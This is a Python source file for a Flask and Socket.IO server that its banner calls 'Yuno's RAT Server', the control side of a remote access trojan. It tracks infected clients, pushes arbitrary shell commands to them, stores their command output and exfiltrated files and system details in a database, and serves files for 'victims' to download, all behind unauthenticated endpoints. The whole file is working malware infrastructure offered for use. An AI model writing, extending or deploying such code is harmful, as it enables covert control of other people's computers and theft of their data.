#!/usr/bin/env python3
import os
import json
import datetime
import sqlite3
from flask import Flask, render_template, request, send_from_directory, jsonify
from flask_socketio import SocketIO, emit
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.config['SECRET_KEY'] = 'secret!'
app.config['UPLOAD_FOLDER'] = 'uploads'
app.config['DOWNLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Ensure directories exist
for folder in [app.config['UPLOAD_FOLDER'], app.config['DOWNLOAD_FOLDER']]:
    if not os.path.exists(folder):
        os.makedirs(folder)

# Initialize SQLite database
def init_db():
    conn = sqlite3.connect('rat_data.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS clients (
                 client_id TEXT PRIMARY KEY,
                 username TEXT,
                 os TEXT,
                 hostname TEXT,
                 last_seen TIMESTAMP
                 )''')
    c.execute('''CREATE TABLE IF NOT EXISTS command_outputs (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 client_id TEXT,
                 command TEXT,
                 output TEXT,
                 current_dir TEXT,
                 timestamp TIMESTAMP,
                 FOREIGN KEY (client_id) REFERENCES clients(client_id)
                 )''')
    c.execute('''CREATE TABLE IF NOT EXISTS exfiltrated_files (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 client_id TEXT,
                 filename TEXT,
                 content TEXT,
                 timestamp TIMESTAMP,
                 FOREIGN KEY (client_id) REFERENCES clients(client_id)
                 )''')
    conn.commit()
    conn.close()

init_db()

# Track connected clients
connected_clients = set()

# Store client info in memory for quick access
client_info = {}

def get_files():
    """Retrieve exfiltrated files from the database."""
    conn = sqlite3.connect('rat_data.db')
    c = conn.cursor()
    c.execute("SELECT filename FROM exfiltrated_files ORDER BY timestamp DESC")
    files = [row[0] for row in c.fetchall()]
    conn.close()
    return files

@app.route('/')
def index():
    """Render the main page with connected clients and uploaded files."""
    files = get_files()
    return render_template('index.html', clients=list(connected_clients), files=files)

@app.route('/send_command', methods=['POST'])
def send_command():
    """Handle command submission from the web interface."""
    client_id = request.form.get('client_id')
    command = request.form.get('command')

    if not client_id or not command:
        return jsonify({"status": "error", "message": "Missing client_id or command"}), 400

    socketio.emit('command', command, to=client_id)
    return jsonify({"status": "success", "message": f"Command '{command}' sent to {client_id}"})

@app.route('/upload_file', methods=['POST'])
def upload_file():
    """Handle file uploads for downloading to victims."""
    if 'file' not in request.files:
        return jsonify({"status": "error", "message": "No file part"}), 400
    file = request.files['file']
    if file.filename == '':
        return jsonify({"status": "error", "message": "No selected file"}), 400
    if file:
        filename = secure_filename(file.filename)
        file_path = os.path.join(app.config['DOWNLOAD_FOLDER'], filename)
        file.save(file_path)
        return jsonify({"status": "success", "filename": filename})

@app.route('/download/<filename>')
def download(filename):
    """Serve files for clients to download."""
    return send_from_directory(app.config['DOWNLOAD_FOLDER'], filename)

@app.route('/view_file/<filename>')
def view_file(filename):
    """Render a page to view the contents of an exfiltrated file."""
    conn = sqlite3.connect('rat_data.db')
    c = conn.cursor()
    c.execute("SELECT content FROM exfiltrated_files WHERE filename = ?", (filename,))
    row = c.fetchone()
    conn.close()
    if row:
        return render_template('view_file.html', filename=filename, file_content=row[0])
    else:
        return "File not found", 404

@app.route('/query_db', methods=['GET'])
def query_db():
    """Endpoint to query the database."""
    conn = sqlite3.connect('rat_data.db')
    c = conn.cursor()
    result = {}
    
    c.execute("SELECT * FROM clients")
    result['clients'] = [dict(zip(['client_id', 'username', 'os', 'hostname', 'last_seen'], row)) for row in c.fetchall()]
    
    c.execute("SELECT * FROM command_outputs")
    result['command_outputs'] = [dict(zip(['id', 'client_id', 'command', 'output', 'current_dir', 'timestamp'], row)) for row in c.fetchall()]
    
    c.execute("SELECT id, client_id, filename, timestamp FROM exfiltrated_files")
    result['exfiltrated_files'] = [dict(zip(['id', 'client_id', 'filename', 'timestamp'], row)) for row in c.fetchall()]
    
    conn.close()
    return jsonify(result)

@app.route('/download_db')
def download_db():
    """Endpoint to download the database file."""
    return send_from_directory('.', 'rat_data.db')

@socketio.on('connect')
def handle_connect():
    """Handle new client connections."""
    client_id = request.sid
    connected_clients.add(client_id)
    print(f"[*] Client connected: {client_id}")
    emit('client_update', list(connected_clients), broadcast=True)
    socketio.emit('request_client_info', broadcast=True)

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnections."""
    client_id = request.sid
    if client_id in connected_clients:
        connected_clients.remove(client_id)
        client_info.pop(client_id, None)
        print(f"[*] Client disconnected: {client_id}")
        emit('client_update', list(connected_clients), broadcast=True)
        socketio.emit('request_client_info', broadcast=True)

@socketio.on('exfil_data')
def handle_exfil_data(data):
    """Handle exfiltrated data from clients."""
    client_id = request.sid
    data = json.loads(data)
    data_type = data.get('type')
    conn = sqlite3.connect('rat_data.db')
    c = conn.cursor()

    if data_type == "system_info":
        system_info = data.get('system', {})
        username = system_info.get('username', 'unknown')
        os_info = system_info.get('os', 'unknown')
        hostname = system_info.get('hostname', 'unknown')
        timestamp = datetime.datetime.now()
        c.execute("INSERT OR REPLACE INTO clients (client_id, username, os, hostname, last_seen) VALUES (?, ?, ?, ?, ?)",
                  (client_id, username, os_info, hostname, timestamp))
        client_info[client_id] = system_info

        filename = f"{client_id}_{timestamp.strftime('%Y%m%d_%H%M%S')}_sysinfo.json"
        content = json.dumps(data, indent=4)
        c.execute("INSERT INTO exfiltrated_files (client_id, filename, content, timestamp) VALUES (?, ?, ?, ?)",
                  (client_id, filename, content, timestamp))
        print(f"[*] Exfiltrated data stored: {filename}")
        socketio.emit('exfil_data', json.dumps({"type": "system_info", "filename": filename}), broadcast=True)

    elif data_type == "command_output":
        command = data.get('command', 'unknown')
        output = data.get('output', '')
        current_dir = data.get('current_dir', 'unknown')
        timestamp = datetime.datetime.now()

        if command.strip().lower() == "whoami":
            username = output.strip()
            c.execute("UPDATE clients SET username = ? WHERE client_id = ?", (username, client_id))
            if client_id not in client_info:
                client_info[client_id] = {}
            client_info[client_id]['username'] = username

        c.execute("INSERT INTO command_outputs (client_id, command, output, current_dir, timestamp) VALUES (?, ?, ?, ?, ?)",
                  (client_id, command, output, current_dir, timestamp))

        emit('command_output', {
            'timestamp': timestamp.strftime("%Y-%m-%d %H:%M:%S"),
            'client_id': client_id,
            'command': command,
            'output': output,
            'current_dir': current_dir
        }, broadcast=True)

    conn.commit()
    conn.close()

    client_info_list = [
        {'id': cid, 'system': info}
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list, broadcast=True)

@socketio.on('request_client_info')
def handle_request_client_info():
    """Handle requests for client info from the web interface."""
    client_info_list = [
        {'id': cid, 'system': info}
        for cid, info in client_info.items()
    ]
    emit('client_info', client_info_list)

if __name__ == "__main__":
    print("=== Yuno's RAT Server ===")
    print("A remote access server by Yuno\n")
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)